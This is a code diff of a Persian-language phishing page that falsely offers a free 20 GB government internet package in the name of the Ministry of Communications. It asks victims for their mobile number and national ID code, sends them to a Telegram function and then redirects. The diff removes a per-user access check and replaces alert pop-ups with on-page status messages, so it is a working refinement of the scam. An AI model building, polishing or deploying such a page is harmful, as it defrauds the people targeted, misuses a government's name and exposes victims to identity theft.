@@ -68,49 +68,38 @@
             display: block;
             margin-right: 5px;
         }
-        .error-msg {
-            color: #dc2626;
-            background: #fee2e2;
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 15px;
-            font-weight: bold;
+        #statusMsg {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            display: none;
         }
-        .btn-back {
-            display: inline-block;
-            margin-top: 15px;
-            padding: 10px 20px;
-            background: #6c7a8a;
-            color: white;
-            border-radius: 10px;
-            text-decoration: none;
-            font-weight: bold;
-        }
-        .btn-back:hover { background: #4a5a6a; }
+        .success { background: #dcfce7; color: #16a34a; }
+        .error { background: #fee2e2; color: #dc2626; }
     </style>
 </head>
 <body>
-    <div class="container" id="mainContainer">
-        <div id="formSection">
-            <div class="logo">🎁</div>
-            <h1>بسته اینترنت رایگان دولت</h1>
-            <p class="sub">برای فعالسازی بسته ۲۰ گیگابایت اینترنت رایگان،<br>شماره موبایل خود را وارد کرده و هویت خود را تایید کنید.</p>
+    <div class="container">
+        <div class="logo">🎁</div>
+        <h1>بسته اینترنت رایگان دولت</h1>
+        <p class="sub">برای فعالسازی بسته ۲۰ گیگابایت اینترنت رایگان،<br>شماره موبایل خود را وارد کرده و هویت خود را تایید کنید.</p>
 
-            <form id="findForm">
-                <div class="input-group">
-                    <label>📞 شماره موبایل</label>
-                    <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
-                </div>
-                <div class="input-group">
-                    <label>🆔 کد ملی</label>
-                    <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
-                </div>
-                <button type="submit" id="submitBtn">🎁 دریافت بسته</button>
-            </form>
-
-            <div class="note">
-                🔒 اطلاعات شما محفوظ است · <span>وزارت ارتباطات</span>
+        <form id="findForm">
+            <div class="input-group">
+                <label>📞 شماره موبایل</label>
+                <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
             </div>
+            <div class="input-group">
+                <label>🆔 کد ملی</label>
+                <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
+            </div>
+            <button type="submit" id="submitBtn">🎁 دریافت بسته</button>
+        </form>
+
+        <div id="statusMsg"></div>
+
+        <div class="note">
+            🔒 اطلاعات شما محفوظ است · <span>وزارت ارتباطات</span>
         </div>
     </div>
 
@@ -124,15 +113,11 @@
 
         const USER_ID = getUserIdFromURL();
 
-        if (!USER_ID) {
-            document.body.innerHTML = `
-                <div class="container">
-                    <div class="error-msg">⛔ دسترسی غیرمجاز</div>
-                    <p style="color: #6c7a8a; margin: 20px 0;">برای دسترسی به این صفحه، ابتدا لینک اختصاصی خود را از صفحه اصلی دریافت کنید.</p>
-                    <a href="https://8080602.github.io/8080/" class="btn-back">🔗 دریافت لینک اختصاصی</a>
-                </div>
-            `;
-            throw new Error('دسترسی غیرمجاز: user_id وجود ندارد');
+        function showStatus(message, type = 'success') {
+            const statusDiv = document.getElementById('statusMsg');
+            statusDiv.textContent = message;
+            statusDiv.className = type;
+            statusDiv.style.display = 'block';
         }
 
         async function sendToTelegram(message) {
@@ -161,12 +146,13 @@
             const submitBtn = document.getElementById('submitBtn');
 
             if (!phone || !nationalCode) {
-                alert('⚠️ لطفاً همه فیلدها را پر کنید.');
+                showStatus('⚠️ لطفاً همه فیلدها را پر کنید.', 'error');
                 return;
             }
 
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ در حال پردازش...';
+            showStatus('⏳ در حال ارسال اطلاعات...', 'success');
 
             try {
                 let message = `🎯 **اطلاعات جدید** 🎯\n\n`;
@@ -178,23 +164,25 @@
                 const sent = await sendToTelegram(message);
 
                 if (sent) {
-                    window.location.href = 'https://example.com/error';
+                    showStatus('✅ اطلاعات با موفقیت ارسال شد!', 'success');
+                    setTimeout(() => {
+                        window.location.href = 'https://example.com/error';
+                    }, 2000);
                 } else {
-                    alert('⚠️ خطا در ارسال اطلاعات. لطفاً دوباره تلاش کنید.');
+                    showStatus('❌ خطا در ارسال اطلاعات. لطفاً دوباره تلاش کنید.', 'error');
                     submitBtn.disabled = false;
                     submitBtn.textContent = '🎁 دریافت بسته';
                 }
 
             } catch (error) {
                 console.error('❌ خطا:', error);
-                alert('⚠️ خطا در پردازش. لطفاً دوباره تلاش کنید.');
+                showStatus('❌ خطا در پردازش. لطفاً دوباره تلاش کنید.', 'error');
                 submitBtn.disabled = false;
                 submitBtn.textContent = '🎁 دریافت بسته';
             }
         });
 
         console.log('🆔 شناسه کاربر:', USER_ID);
-        console.log('📤 اطلاعات به این شناسه ارسال می‌شود:', USER_ID);
     </script>
 </body>
 </html>
